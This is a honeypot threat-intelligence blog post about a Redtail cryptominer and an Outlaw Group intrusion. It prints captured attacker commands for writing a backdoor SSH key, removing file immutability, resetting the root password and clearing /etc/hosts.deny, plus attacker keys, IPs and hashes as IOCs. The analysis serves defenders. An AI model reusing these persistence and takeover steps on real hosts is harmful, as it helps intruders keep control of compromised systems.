---
title: "Two Threat Actors, One Honeypot, 90 Minutes"
date: 2026-03-25
draft: false
tags: ["honeypot", "threat-intel", "redtail", "outlaw", "cryptominer", "cowrie"]
description: "Redtail cryptominer and Outlaw Group captured back-to-back within 90 minutes of honeypot deployment, with the second actor specifically evicting the first."
---
## Introduction

On the evening of March 24, 2026, I deployed a Cowrie SSH honeypot as part of a broader threat intelligence project. Within 90 minutes of going live, the honeypot captured two complete, distinct attack chains from two separate threat actors — arriving 20 minutes apart, with the second actor specifically evicting the first.

Actor 1 — **Redtail** cryptominer — deployed a full multi-architecture mining toolkit at 03:00 UTC, including a `clean.sh` component that returned **0/62 detections on VirusTotal** at time of analysis.

Actor 2 — consistent with the **Outlaw Group** (`mdrfckr` SSH key) — arrived at 03:20 UTC, wiped Redtail's backdoor, installed their own persistence, and performed thorough host reconnaissance across multiple return sessions.

This post documents both attack chains in full, with IOCs for each actor.

---

## Honeypot Setup

- **Platform:** DigitalOcean VPS, Ubuntu 24.04
- **Software:** Cowrie 2.9.15, listening on port 2222 with nftables redirect from port 22
- **Running as:** non-privileged `cowrie` user with `CAP_NET_BIND_SERVICE`
- **Time to first capture:** ~90 minutes after going live

---

## Actor 1: Redtail Cryptominer

### Initial Access

| Field | Value |
|---|---|
| **Timestamp** | 2026-03-25 02:59 UTC |
| **Source IP** | `130.12.180.51` |
| **Username** | `root` |
| **Password** | `P` (single character) |

### Attack Chain

The deployment completed in under 3 seconds with no interactive exploration — fully automated:

```
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh
sh setup.sh
```

Six files were uploaded via SFTP immediately after authentication.

### Files Captured

| Filename | SHA-256 | Size |
|---|---|---|
| clean.sh | `8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b` | 398 B |
| setup.sh | `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | 1,951 B |
| redtail.x86_64 | `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2c3cdc7` | 1.7 MB |
| redtail.i686 | `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | 1.3 MB |
| redtail.arm8 | `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | 1.8 MB |
| redtail.arm7 | `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | 1.5 MB |
| unknown | `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | 795 B |

### Script Analysis: setup.sh

The setup script performs the following sequence:

**1. Random filename generation** using `/dev/urandom` or OpenSSL, dot-prefixed to hide in process listings. Hardcoded fallback: `"redtail"`.

**2. Architecture detection:**
```bash
ARCH=$(uname -mp)
# Maps to: x86_64, i686, arm8, arm7
```

**3. Writable+executable directory hunting** — scans the full filesystem for user-owned rwx directories with 2MB write capacity, excluding `/tmp`, `/proc`, and `noexec` mounts.

**4. Binary deployment** — copies the correct architecture binary to the selected directory, sets executable, launches with argument `ssh`.

**5. Self-cleanup** — removes all `redtail.*` files from current and working directories.

**6. SSH backdoor installation:**
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629
```

This key is a known Redtail IOC documented in ISC diaries [30950](https://isc.sans.edu/diary/30950) and [31568](https://isc.sans.edu/diary/31568), in use since at least June 2023.

### Notable Finding: clean.sh — 0/62 on VirusTotal

At time of submission, `clean.sh` (SHA-256: `8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b`) returned **0 detections across 62 AV vendors** on VirusTotal. VirusTotal's sandbox applied behavioral tags: `powershell`, `long-sleeps`, `detect-debug-environment`. Community score: **-3**.

Prior ISC reporting documented all Redtail samples scoring a minimum of 19/62. This variant's cleanup script appears to be evading all current AV signatures. The sample has been submitted to ClamAV for signature development.

---

## Actor 2: Outlaw Group

### Initial Access

| Field | Value |
|---|---|
| **First seen** | 2026-03-25 03:20 UTC — 20 minutes after Redtail |
| **Source IP** | `187.212.40.215` |
| **Hostname** | `dsl-215-40-212-187-dynamic.prod-infinitum.com.mx` |
| **ISP** | AS8151 UNINET, Puebla, Mexico |
| **Username** | `root` |
| **Password** | `QWERasdf` |
| **Return sessions** | 5 additional sessions between 03:20–03:41 UTC |

### Attack Chain

Unlike Redtail's automated 3-second deployment, Outlaw's operation involved multiple return sessions with escalating activity.

**Session 1 — Backdoor installation (03:20 UTC):**
```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr" >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```

The `chattr -ia` command is specifically designed to remove immutability and append-only attributes — this is IOC-aware behavior targeting Redtail's persistence mechanism directly. `lockr -ia .ssh` failed (command not found in Cowrie's fake environment) but the intent is clear: Outlaw knows Redtail locks `authorized_keys` with `chattr` and wrote their cleanup to undo it.

**Session 2 — Host reconnaissance (03:30 UTC):**

After confirming backdoor installation, Outlaw returned and performed thorough host profiling:

```bash
echo "root:KiMj2JGUAHqR"|chpasswd|bash          # password reset
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh  # kill competing processes
echo > /etc/hosts.deny                            # clear host access controls
cat /proc/cpuinfo | grep name | wc -l            # CPU core count
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'  # CPU model
free -m | grep Mem | awk '{print $2,$3,$4,$5,$6,$7}'  # memory
ls -lh $(which ls)                               # binary check (rootkit detection)
crontab -l                                       # existing persistence
w                                                # logged in users
uname -m                                         # architecture
uname -a                                         # full system info
whoami                                           # privilege confirmation
lscpu | grep Model                               # detailed CPU model
df -h | head -n 2 | awk 'FNR == 2 {print $2;}'  # disk space
top                                              # running processes
```

This is a standard Outlaw host assessment sequence — CPU core count and model are used to estimate mining profitability before deploying the miner payload.

**Sessions 3–5 (03:33–03:41 UTC):** Repeated backdoor re-installation, suggesting an automated verification loop confirming persistence across multiple concurrent scanning threads. A second randomized root password was set: `vU3EqXi7Kyit`.

### Backdoor Key

```
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
```

The `mdrfckr` comment is a known Outlaw Group campaign identifier documented in prior threat intelligence reporting.

---

## Timeline

| Time (UTC) | Actor | Event |
|---|---|---|
| 03:00 | Redtail | Initial access via `root/P` |
| 03:00 | Redtail | 6 files uploaded via SFTP |
| 03:00 | Redtail | `clean.sh` executed, `setup.sh` executed |
| 03:00 | Redtail | SSH backdoor (`rsa-key-20230629`) installed |
| 03:20 | Outlaw | Initial access via `root/QWERasdf` |
| 03:20 | Outlaw | `chattr -ia .ssh` — Redtail backdoor evicted |
| 03:20 | Outlaw | `mdrfckr` SSH key installed |
| 03:30 | Outlaw | Return session — host reconnaissance |
| 03:30 | Outlaw | Root password reset: `KiMj2JGUAHqR` |
| 03:30 | Outlaw | Competing processes killed, `/etc/hosts.deny` cleared |
| 03:33–03:41 | Outlaw | 4 additional sessions — backdoor verification loop |
| 03:38 | Outlaw | Second root password set: `vU3EqXi7Kyit` |

---

## Indicators of Compromise

### Redtail
- **IP:** `130.12.180.51`
- **SSH key:** `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT...kUMRr rsa-key-20230629`
- **Hashes:** see file table above

### Outlaw Group
- **IP:** `187.212.40.215` (AS8151 UNINET, Puebla, Mexico)
- **SSH key:** `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2...oRw== mdrfckr`
- **Passwords set:** `KiMj2JGUAHqR`, `vU3EqXi7Kyit`
- **Downloaded:** `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` (389 bytes — Outlaw dropper/key file)

---

## Observations

**1. Active competition between threat actors.** Outlaw's use of `chattr -ia` specifically targets Redtail's persistence mechanism. This is not generic cleanup — it is IOC-aware eviction. Both campaigns are sufficiently widespread that operators of each are coding around the other's TTPs.

**2. Speed of exploitation.** Both actors arrived within 90 minutes of the honeypot going live. Port 22 scanning at internet scale is continuous and near-instantaneous. Any internet-exposed SSH service with weak credentials should be assumed compromised within hours.

**3. clean.sh evasion.** The 0/62 VirusTotal result for Redtail's cleanup script is the most operationally significant finding from this capture. Defenders relying solely on endpoint AV may detect the miner binary but miss the cleanup script that kills competing processes and prepares persistence — leaving the infection partially visible while the cleanup runs undetected.

**4. Outlaw's reconnaissance depth.** The CPU profiling commands suggest Outlaw is assessing mining profitability before full deployment — a more resource-conscious approach than Redtail's spray-and-pray. The randomized passwords across sessions may indicate per-session credential generation to complicate eviction.

---

## References

- ISC Diary 30950: https://isc.sans.edu/diary/30950
- ISC Diary 31568: https://isc.sans.edu/diary/31568
- Akamai Redtail analysis: https://www.akamai.com/blog/security-research/2024-redtail-cryptominer-pan-os-cve-exploit
- Forescout Redtail/PHP: https://www.forescout.com/blog/new-redtail-malware-exploited-via-php-security-vulnerability/
